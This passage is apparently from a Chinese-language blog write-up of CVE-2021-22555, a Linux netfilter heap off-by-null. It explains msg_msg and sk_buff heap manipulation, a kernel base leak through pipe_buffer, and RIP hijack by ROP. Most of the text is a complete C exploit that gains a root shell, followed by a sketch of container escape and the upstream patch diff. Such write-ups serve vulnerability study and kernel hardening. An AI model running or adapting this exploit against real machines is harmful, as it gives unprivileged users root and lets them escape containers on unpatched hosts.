+接下来我们考虑如何通过伪造 `msg_msg` 结构体完成信息泄露，我们不难想到的是可以伪造一个 `msg_msg` 结构体，将其 `m_ts`
+域设为一个较大值， **从而越界读取到相邻辅助消息的 header，泄露出堆上地址**
+
+![](./img/7592613883755371661.png)
+
+我们泄露出来的是哪个地址？让我们重新将目光放回到消息队列的结构上：
+
+![](./img/1479252363402243043.png)
+
+我们不难知道的是，该辅助消息的 prev 指针指向其主消息，而该辅助消息的 next 指针指向该消息队列的 `msg_queue`
+结构，这是目前我们已知的两个“堆上地址”
+
+接下来我们伪造 `msg_msg->next`， **将其指向我们的 UAF object
+相邻的辅助消息对应的主消息头部往前，从而读出该主消息的头部，泄露出对应的辅助消息的地址** ，有了这个辅助消息的地址，再减去 0x400 **便是我们的
+UAF 对象的地址**
+
+> 通过伪造 msg_msg->next
+> 可以完成任意地址读，参见[这里](https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-> PART-II/#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB)
+
+### Step.IV 堆喷 `pipe_buffer`，泄露内核基址
+
+现在我们已知了可控区域的地址，接下来让我们来考虑泄露内核 .text 段的基址，以及如何劫持 RIP 完成提权
+
+之前我们为什么将辅助消息的大小设为 0x400？除了方便对齐以外，还有一层考虑就是这个大小刚好有一个十分实用的结构体 `pipe_buffer` 数组，
+**既能帮我们泄露内核代码段基址，也能帮我们劫持 RIP**
+
+当我们创建一个管道时，在内核中会生成数个连续的 `pipe_buffer` 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个
+object
+
+    
+    
+    /**
+     *  struct pipe_buffer - a linux kernel pipe buffer
+     *  @page: the page containing the data for the pipe buffer
+     *  @offset: offset of data inside the @page
+     *  @len: length of data inside the @page
+     *  @ops: operations associated with this buffer. See @pipe_buf_operations.
+     *  @flags: pipe buffer flags. See above.
+     *  @private: private data owned by the ops.
+     **/
+    struct pipe_buffer {
+        struct page *page;
+        unsigned int offset, len;
+        const struct pipe_buf_operations *ops;
+        unsigned int flags;
+        unsigned long private;
+    };
+    
+
+在 `pipe_buffer` 中存在一个函数表成员 `pipe_buf_operations` ，其指向内核中的函数表
+`anon_pipe_buf_ops`，若我们能够将其读出，便能泄露出内核基址，操作如下：
+
+  * 利用 `sk_buff` 修复辅助消息，之后从消息队列中接收该辅助消息，此时该 object 重回 slub 中，但 `sk_buff` 仍指向该 object
+  * 喷射 `pipe_buffer`，之后再接收 `sk_buff` 数据包， **我们便能读出 pipe_buffer 上数据，泄露内核基址**
+
+### Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权
+
+当我们关闭了管道的两端时，会触发 `pipe_buffer->pipe_buffer_operations->release` 这一指针，而 UAF
+object 的地址对我们而言是已知的，因此 **我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP
+chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权**
+
+![](./img/1765475520855561086.png)
+
+### Final EXPLOIT
+
+最终的 exp 如下：
+
+    
+    
+    #define _GNU_SOURCE
+    #include <err.h>
+    #include <errno.h>
+    #include <fcntl.h>
+    #include <inttypes.h>
+    #include <sched.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <unistd.h>
+    #include <net/if.h>
+    #include <netinet/in.h>
+    #include <sys/ipc.h>
+    #include <sys/msg.h>
+    #include <sys/socket.h>
+    #include <sys/syscall.h>
+    #include <linux/netfilter_ipv4/ip_tables.h>
+    
+    #define PRIMARY_MSG_SIZE 0x1000
+    #define SECONDARY_MSG_SIZE 0x400
+    
+    #define PRIMARY_MSG_TYPE    0x41
+    #define SECONDARY_MSG_TYPE  0x42
+    #define VICTIM_MSG_TYPE     0x1337
+    #define MSG_TAG     0xAAAAAAAA
+    
+    #define SOCKET_NUM 16
+    #define SK_BUFF_NUM 128
+    #define PIPE_NUM 256
+    #define MSG_QUEUE_NUM 4096
+    
+    #define ANON_PIPE_BUF_OPS 0xffffffff82076500
+    #define PREPARE_KERNEL_CRED 0xffffffff810d1350
+    #define INIT_CRED 0xffffffff82a63be0
+    #define COMMIT_CREDS 0xffffffff810d0ec0
+    #define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30
+    #define POP_RDI_RET 0xffffffff810310a3
+    
+    size_t user_cs, user_ss, user_sp, user_eflags;
+    
+    void saveStatus()
+    {
+        __asm__("mov user_cs, cs;"
+                "mov user_ss, ss;"
+                "mov user_sp, esp;"
+                "pushf;"
+                "pop user_eflags;"
+                );
+        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
+    }
+    
+    struct list_head
+    {
+        uint64_t    next;
+        uint64_t    prev;
+    };
+    
+    struct msg_msg
+    {
+        struct list_head m_list;
+        uint64_t    m_type;
+        uint64_t    m_ts;
+        uint64_t    next;
+        uint64_t    security;
+    };
+    
+    struct msg_msgseg
+    {
+        uint64_t    next;
+    };
+    
+    struct 
+    {
+        long mtype;
+        char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];
+    }primary_msg;
+    
+    struct 
+    {
+        long mtype;
+        char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];
+    }secondary_msg;
+    
+    /*
+     * skb_shared_info need to take 320 bytes at the tail
+     * so the max size of buf we should send is:
+     * 1024 - 320 = 704
+     */
+    char fake_secondary_msg[704];
+    
+    struct
+    {
+        long mtype;
+        char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];
+    } oob_msg;
+    
+    struct pipe_buffer
+    {
+        uint64_t    page;
+        uint32_t    offset, len;
+        uint64_t    ops;
+        uint32_t    flags;
+        uint32_t    padding;
+        uint64_t    private;
+    };
+    
+    struct pipe_buf_operations
+    {
+        uint64_t    confirm;
+        uint64_t    release;
+        uint64_t    try_steal;
+        uint64_t    get;
+    };
+    
+    void errExit(char *msg)
+    {
+        printf("\033[31m\033[1m[x] Error: %s\033[0m\n", msg);
+        exit(EXIT_FAILURE);
+    }
+    
+    int readMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+    {
+        return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0);
+    }
+    
+    int writeMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+    {
+        *(long*)msgp = msgtyp;
+        return msgsnd(msqid, msgp, msgsz - sizeof(long), 0);
+    }
+    
+    int peekMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+    {
+        return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT);
+    }
+    
+    void buildMsg(struct msg_msg *msg, uint64_t m_list_next,
+        uint64_t m_list_prev, uint64_t m_type, uint64_t m_ts, 
+        uint64_t next, uint64_t security)
+    {
+        msg->m_list.next = m_list_next;
+        msg->m_list.prev = m_list_prev;
+        msg->m_type = m_type;
+        msg->m_ts = m_ts;
+        msg->next = next;
+        msg->security = security;
+    }
+    
+    int spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
+    {
+        for (int i = 0; i < SOCKET_NUM; i++)
+            for (int j = 0; j < SK_BUFF_NUM; j++)
+            {
+                // printf("[-] now %d, num %d\n", i, j);
+                if (write(sk_socket[i][0], buf, size) < 0)
+                    return -1;
+            }
+        return 0;
+    }
+    
+    int freeSkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
+    {
+        for (int i = 0; i < SOCKET_NUM; i++)
+            for (int j = 0; j < SK_BUFF_NUM; j++)
+                if (read(sk_socket[i][1], buf, size) < 0)
+                    return -1;
+        return 0;
+    }
+    
+    void trigerOutOfBoundWrite(int socket_fd)
+    {
+        struct __attribute__((__packed__)) {
+            struct ipt_replace replace;
+            struct ipt_entry entry;
+            struct xt_entry_match match;
+            char pad[0x108 + PRIMARY_MSG_SIZE - 0x200 - 0x2];
+            struct xt_entry_target target;
+        } data = {0};
+    
+        data.replace.num_counters = 1;
+        data.replace.num_entries = 1;
+        data.replace.size = sizeof(data.entry) + sizeof(data.match)
+                + sizeof(data.pad) + sizeof(data.target);
+    
+        data.entry.next_offset = sizeof(data.entry) + sizeof(data.match)
+                + sizeof(data.pad) + sizeof(data.target);
+        data.entry.target_offset = 
+                sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad);
+    
+        data.match.u.user.match_size = sizeof(data.match) + sizeof(data.pad);
+        strcpy(data.match.u.user.name, "icmp");
+        data.match.u.user.revision = 0;
+    
+        data.target.u.user.target_size = sizeof(data.target);
+        strcpy(data.target.u.user.name, "NFQUEUE");
+        data.target.u.user.revision = 1;
+    
+        // partial overwrite the next object
+        if (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)))
+            if (errno == ENOPROTOOPT)
+                errExit("ip_tables module is not loaded!");
+    }
+    
+    void getRootShell(void)
+    {
+        if (getuid())
+            errExit("failed to gain the root!");
+    
+        printf("\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n");
+        system("/bin/sh");
+    }
+    
+    int main(int argc, char **argv, char **envp)
+    {
+        int         socket_fd;
+        int         sk_sockets[SOCKET_NUM][2];
+        int         pipe_fd[PIPE_NUM][2];
+        int         msqid[MSG_QUEUE_NUM];
+        int         victim_qid, real_qid;
+        struct msg_msg  *nearby_msg;
+        struct msg_msg  *nearby_msg_prim;
+        struct pipe_buffer *pipe_buf_ptr;
+        struct pipe_buf_operations *ops_ptr;
+        uint64_t    victim_addr;
+        uint64_t    kernel_base;
+        uint64_t    kernel_offset;
+        uint64_t    *rop_chain;
+        int         rop_idx;
+        cpu_set_t   cpu_set;
+    
+        saveStatus();
+    
+        /*
+         * Step.O
+         * Initialization
+         */
+        puts("\033[32m\033[1m[+] CVE-2021-22555 Linux Privilege Escalation.\033[0m");
+    
+        // ident namespace
+        if (unshare(CLONE_NEWUSER) < 0)
+            errExit("failed to unshare(CLONE_NEWUSER)");
+        if (unshare(CLONE_NEWNET) < 0)
+            errExit("failed to unshare(CLONE_NEWNET)");
+    
+        // run the exp on specific core only
+        CPU_ZERO(&cpu_set);
+        CPU_SET(0, &cpu_set);
+        sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
+    
+        // socket to trigert off-by-null
+        if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+            errExit("failed to create socket!");
+    
+        // socket pairs to spray sk_buff
+        for (int i = 0; i < SOCKET_NUM; i++)
+            if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) < 0)
+                errExit("failed to create socket pair!");
+    
+        /*
+         * Step.I
+         * build msg_queue, spray primary and secondary msg_msg,
+         * and use OOB write to construct the overlapping
+         */
+        puts("\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m");
+    
+        puts("[*] Build message queue...");
+        // build 4096 message queue
+        for (int i = 0; i < MSG_QUEUE_NUM; i++)
+        {
+            if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0)
+                errExit("failed to create msg_queue!");
+        }
+    
+        puts("[*] Spray primary and secondary msg_msg...");
+    
+        memset(&primary_msg, 0, sizeof(primary_msg));
+        memset(&secondary_msg, 0, sizeof(secondary_msg));
+    
+        // spray primary and secondary message
+        for (int i = 0; i < MSG_QUEUE_NUM; i++)
+        {
+            *(int *)&primary_msg.mtext[0] = MSG_TAG;
+            *(int *)&primary_msg.mtext[4] = i;
+            if (writeMsg(msqid[i], &primary_msg, 
+                    sizeof(primary_msg), PRIMARY_MSG_TYPE) < 0)
+                errExit("failed to send primary msg!");
+    
+            *(int *)&secondary_msg.mtext[0] = MSG_TAG;
+            *(int *)&secondary_msg.mtext[4] = i;
+            if (writeMsg(msqid[i], &secondary_msg, 
+                    sizeof(secondary_msg), SECONDARY_MSG_TYPE) < 0)
+                errExit("failed to send secondary msg!");
+        }
+    
+        // create hole in primary msg_msg
+        puts("[*] Create holes in primary msg_msg...");
+        for (int i = 0; i < MSG_QUEUE_NUM; i += 1024)
+        {
+            if (readMsg(msqid[i], &primary_msg, 
+                    sizeof(primary_msg), PRIMARY_MSG_TYPE) < 0)
+                errExit("failed to receive primary msg!");
+        }
+    
+        // triger off-by-null on primary msg_msg
+        puts("[*] Trigger OOB write to construct the overlapping...");
+        trigerOutOfBoundWrite(socket_fd);
+    
+        // find the queues that have the same secondary msg_msg
+        puts("[*] Checking whether succeeded to make overlapping...");
+        victim_qid = real_qid = -1;
+        for (int i = 0; i < MSG_QUEUE_NUM; i++)
+        {
+            if ((i % 1024) == 0)  // the hole
+                continue;
+    
+            if (peekMsg(msqid[i], &secondary_msg, 
+                    sizeof(secondary_msg), 1) < 0)
+            {
+                printf("[x] error qid: %d\n", i);
+                errExit("failed to receive secondary msg!");
+            }
+    
+            if (*(int*) &secondary_msg.mtext[0] != MSG_TAG)
+                errExit("failed to make corruption!");
+    
+            if (*(int*) &secondary_msg.mtext[4] != i)
+            {
+                victim_qid = i;
+                real_qid = *(int*) &secondary_msg.mtext[4];
+                break;
+            }
+        }
+    
+        if (victim_qid < 0)
+            errExit("failed to make overlapping!");
+    
+        printf("\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n", 
+                victim_qid, real_qid);
+    
+        /*
+         * Step.II
+         * construct UAF
+         */
+        puts("\n\033[34m\033[1m[*] Step.II construct UAF\033[0m");
+    
+        // free the victim secondary msg_msg, then we get a UAF
+        if (readMsg(msqid[real_qid], &secondary_msg, 
+                    sizeof(secondary_msg), SECONDARY_MSG_TYPE) < 0)
+            errExit("failed to receive secondary msg!");
+    
+        puts("\033[32m\033[1m[+] UAF construction complete!\033[0m");
+    
+        /*
+         * Step.III
+         * spray sk_buff to leak msg_msg addr
+         * construct fake msg_msg to leak addr of UAF obj
+         */
+        puts("\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m");
+    
+        // spray sk_buff to construct fake msg_msg
+        puts("[*] spray sk_buff...");
+        buildMsg((struct msg_msg *)fake_secondary_msg, 
+                *(uint64_t*)"arttnba3", *(uint64_t*)"arttnba3", 
+                VICTIM_MSG_TYPE, 0x1000 - sizeof(struct msg_msg), 0, 0);
+        if (spraySkBuff(sk_sockets, fake_secondary_msg, 
+                sizeof(fake_secondary_msg)) < 0)
+            errExit("failed to spray sk_buff!");
+    
+        // use fake msg_msg to read OOB
+        puts("[*] OOB read from victim msg_msg");
+        if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0)
+            errExit("failed to read victim msg!");
+    
+        if (*(int *)&oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)
+            errExit("failed to rehit the UAF object!");
+    
+        nearby_msg = (struct msg_msg*) 
+                &oob_msg.mtext[(SECONDARY_MSG_SIZE) - sizeof(struct msg_msg)];
+    
+        printf("\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n", 
+                nearby_msg->m_list.prev);
+    
+        // release and re-spray sk_buff to construct fake msg_msg
+        // so that we can make an arbitrary read on a primary msg_msg
+        if (freeSkBuff(sk_sockets, fake_secondary_msg, 
+                sizeof(fake_secondary_msg)) < 0)
+            errExit("failed to release sk_buff!");
+    
+        buildMsg((struct msg_msg *)fake_secondary_msg, 
+                *(uint64_t*)"arttnba3", *(uint64_t*)"arttnba3", 
+                VICTIM_MSG_TYPE, sizeof(oob_msg.mtext), 
+                nearby_msg->m_list.prev - 8, 0);
+        if (spraySkBuff(sk_sockets, fake_secondary_msg, 
+                sizeof(fake_secondary_msg)) < 0)
+            errExit("failed to spray sk_buff!");
+    
+        puts("[*] arbitrary read on primary msg of msg nearby victim");
+        if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0)
+            errExit("failed to read victim msg!");
+    
+        if (*(int *)&oob_msg.mtext[0x1000] != MSG_TAG)
+            errExit("failed to rehit the UAF object!");
+    
+        // cal the addr of UAF obj by the header we just read out
+        nearby_msg_prim = (struct msg_msg*) 
+                &oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];
+        victim_addr = nearby_msg_prim->m_list.next - 0x400;
+    
+        printf("\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n", 
+                nearby_msg_prim->m_list.next);
+        printf("\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n", victim_addr);
+    
+        /*
+         * Step.IV
+         * fix the header of UAF obj and release it
+         * spray pipe_buffer and leak the kernel base
+         */
+        puts("\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m");
+    
+        // re-construct the msg_msg to fix it
+        puts("[*] fixing the UAF obj as a msg_msg...");
+        if (freeSkBuff(sk_sockets, fake_secondary_msg, 
+                sizeof(fake_secondary_msg)) < 0)
+            errExit("failed to release sk_buff!");
+    
+        memset(fake_secondary_msg, 0, sizeof(fake_secondary_msg));
+        buildMsg((struct msg_msg *)fake_secondary_msg, 
+                victim_addr + 0x800, victim_addr + 0x800, // a valid kheap addr is valid
+                VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - sizeof(struct msg_msg), 
+                0, 0);
+        if (spraySkBuff(sk_sockets, fake_secondary_msg, 
+                sizeof(fake_secondary_msg)) < 0)
+            errExit("failed to spray sk_buff!");
+    
+        // release UAF obj as secondary msg
+        puts("[*] release UAF obj in message queue...");
+        if (readMsg(msqid[victim_qid], &secondary_msg, 
+                    sizeof(secondary_msg), VICTIM_MSG_TYPE) < 0)
+            errExit("failed to receive secondary msg!");
+    
+        // spray pipe_buffer
+        puts("[*] spray pipe_buffer...");
+        for (int i = 0; i < PIPE_NUM; i++)
+        {
+            if (pipe(pipe_fd[i]) < 0)
+                errExit("failed to create pipe!");
+    
+            // write something to activate it
+            if (write(pipe_fd[i][1], "arttnba3", 8) < 0)
+                errExit("failed to write the pipe!");
+        }
+    
+        // release the sk_buff to read pipe_buffer, leak kernel base
+        puts("[*] release sk_buff to read pipe_buffer...");
+        pipe_buf_ptr = (struct pipe_buffer *) &fake_secondary_msg;
+        for (int i = 0; i < SOCKET_NUM; i++)
+        {
+            for (int j = 0; j < SK_BUFF_NUM; j++)
+            {
+                if (read(sk_sockets[i][1], &fake_secondary_msg, 
+                        sizeof(fake_secondary_msg)) < 0)
+                    errExit("failed to release sk_buff!");
+    
+                if (pipe_buf_ptr->ops > 0xffffffff81000000)
+                {
+                    printf("\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n", 
+                            pipe_buf_ptr->ops);
+                    kernel_offset = pipe_buf_ptr->ops - ANON_PIPE_BUF_OPS;
+                    kernel_base = 0xffffffff81000000 + kernel_offset;
+                }
+            }
+        }
+    
+        printf("\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n", 
+                kernel_base, kernel_offset);
+    
+        /*
+         * Step.V
+         * hijack the ops of pipe_buffer
+         * free all pipe to trigger fake ptr
+         * so that we hijack the RIP
+         * construct a ROP on pipe_buffer
+         */
+        puts("\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m");
+    
+        puts("[*] pre-construct data in userspace...");
+        pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;
+        pipe_buf_ptr->ops = victim_addr;
+    
+        ops_ptr = (struct pipe_buf_operations *) fake_secondary_msg;
+        ops_ptr->release = 0xffffffff8183b4d3 + kernel_offset;// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret
+        ops_ptr->confirm = 0xffffffff81689ea4 + kernel_offset;// pop rdx ; pop r13 ; pop rbp ; ret
+    
+        rop_idx = 0;
+        rop_chain = (uint64_t*) &fake_secondary_msg[0x20];
+        rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;
+        rop_chain[rop_idx++] = kernel_offset + INIT_CRED;
+        rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;
+        rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22;
+        rop_chain[rop_idx++] = *(uint64_t*) "arttnba3";
+        rop_chain[rop_idx++] = *(uint64_t*) "arttnba3";
+        rop_chain[rop_idx++] = getRootShell;
+        rop_chain[rop_idx++] = user_cs;
+        rop_chain[rop_idx++] = user_eflags;
+        rop_chain[rop_idx++] = user_sp;
+        rop_chain[rop_idx++] = user_ss;
+    
+        puts("[*] spray sk_buff to hijack pipe_buffer...");
+        if (spraySkBuff(sk_sockets, fake_secondary_msg, 
+                sizeof(fake_secondary_msg)) < 0)
+            errExit("failed to spray sk_buff!");
+    
+        puts("[*] trigger fake ops->release to hijack RIP...");
+        for (int i = 0; i < PIPE_NUM; i++)
+        {
+            close(pipe_fd[i][0]);
+            close(pipe_fd[i][1]);
+        }
+    }
+    
+
+运行即可完成提权
+
+![](./img/8392991140645836931.png)
+
+## 容器逃逸
+
+### Step.VI 切换进程命名空间，完成容器逃逸
+
+现在我们已经能够在内核空间进行 ROP
+了，那么完成容器逃逸其实是顺水推舟的事情，容器常用的隔离手段是利用命名空间进行隔离，因此我们只需要在内核中将进程的命名空间切换为初始的全局命名空间
+`init_nsproxy` 即可完成容器逃逸，执行`switch_task_namespaces(find_task_by_vpid(1),
+init_nsproxy)` 即可替换掉当前进程的命名空间
+
+> 这里就不重新摘抄一遍 exp 占版面了：）
+
+# 0x03.漏洞修复
+
+内核主线在 [这个
+commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b29c457a6511435960115c0f548c4360d5f4801d)
+中完成了对该漏洞的修复，主要就是 **取消掉对 pad 置 0 的这一操作** ，而是选择在 `translate_compat_table()`
+中进行预先的置 0，从而避免了为了将 pad 区域置 0 而导致的堆上 off-by-null，笔者个人认为这个方案还算是比较成功的
+
+    
+    
+    diff --git a/net/ipv4/netfilter/arp_tables.c b/net/ipv4/netfilter/arp_tables.c
+    index 6c26533480dd1..d6d45d820d79a 100644
+    --- a/net/ipv4/netfilter/arp_tables.c
+    +++ b/net/ipv4/netfilter/arp_tables.c
+    @@ -1193,6 +1193,8 @@ static int translate_compat_table(struct net *net,
+        if (!newinfo)
+            goto out_unlock;
+    
+    +   memset(newinfo->entries, 0, size);
+    +
+        newinfo->number = compatr->num_entries;
+        for (i = 0; i < NF_ARP_NUMHOOKS; i++) {
+            newinfo->hook_entry[i] = compatr->hook_entry[i];
+    diff --git a/net/ipv4/netfilter/ip_tables.c b/net/ipv4/netfilter/ip_tables.c
+    index f15bc21d73016..f77ea0dbe6562 100644
+    --- a/net/ipv4/netfilter/ip_tables.c
+    +++ b/net/ipv4/netfilter/ip_tables.c
+    @@ -1428,6 +1428,8 @@ translate_compat_table(struct net *net,
+        if (!newinfo)
+            goto out_unlock;
+    
+    +   memset(newinfo->entries, 0, size);
+    +
+        newinfo->number = compatr->num_entries;
+        for (i = 0; i < NF_INET_NUMHOOKS; i++) {
+            newinfo->hook_entry[i] = compatr->hook_entry[i];
+    diff --git a/net/ipv6/netfilter/ip6_tables.c b/net/ipv6/netfilter/ip6_tables.c
+    index 2e2119bfcf137..eb2b5404806c6 100644
+    --- a/net/ipv6/netfilter/ip6_tables.c
+    +++ b/net/ipv6/netfilter/ip6_tables.c
+    @@ -1443,6 +1443,8 @@ translate_compat_table(struct net *net,
+        if (!newinfo)
+            goto out_unlock;
+    
+    +   memset(newinfo->entries, 0, size);
+    +
+        newinfo->number = compatr->num_entries;
+        for (i = 0; i < NF_INET_NUMHOOKS; i++) {
+            newinfo->hook_entry[i] = compatr->hook_entry[i];
+    diff --git a/net/netfilter/x_tables.c b/net/netfilter/x_tables.c
+    index 6bd31a7a27fc5..92e9d4ebc5e8d 100644
+    --- a/net/netfilter/x_tables.c
+    +++ b/net/netfilter/x_tables.c
+    @@ -733,7 +733,7 @@ void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,
+     {
+        const struct xt_match *match = m->u.kernel.match;
+        struct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m;
+    -   int pad, off = xt_compat_match_offset(match);
+    +   int off = xt_compat_match_offset(match);
+        u_int16_t msize = cm->u.user.match_size;
+        char name[sizeof(m->u.user.name)];
+    
+    @@ -743,9 +743,6 @@ void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr,
+            match->compat_from_user(m->data, cm->data);
+        else
+            memcpy(m->data, cm->data, msize - sizeof(*cm));
+    -   pad = XT_ALIGN(match->matchsize) - match->matchsize;
+    -   if (pad > 0)
+    -       memset(m->data + match->matchsize, 0, pad);
+    
+        msize += off;
+        m->u.user.match_size = msize;
+    @@ -1116,7 +1113,7 @@ void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,
+     {
+        const struct xt_target *target = t->u.kernel.target;
+        struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;
+    -   int pad, off = xt_compat_target_offset(target);
+    +   int off = xt_compat_target_offset(target);
+        u_int16_t tsize = ct->u.user.target_size;
+        char name[sizeof(t->u.user.name)];
+    
+    @@ -1126,9 +1123,6 @@ void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,
+            target->compat_from_user(t->data, ct->data);
+        else
+            memcpy(t->data, ct->data, tsize - sizeof(*ct));
+    -   pad = XT_ALIGN(target->targetsize) - target->targetsize;
+    -   if (pad > 0)
+    -       memset(t->data + target->targetsize, 0, pad);
+    
+        tsize += off;
+        t->u.user.target_size = tsize;
+    
+
+# 0x.FF Reference
+
+[CVE-2021-22555: Turning \x00\x00 into
+10000$](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html)
+
+<https://www.anquanke.com/post/id/254027>
+
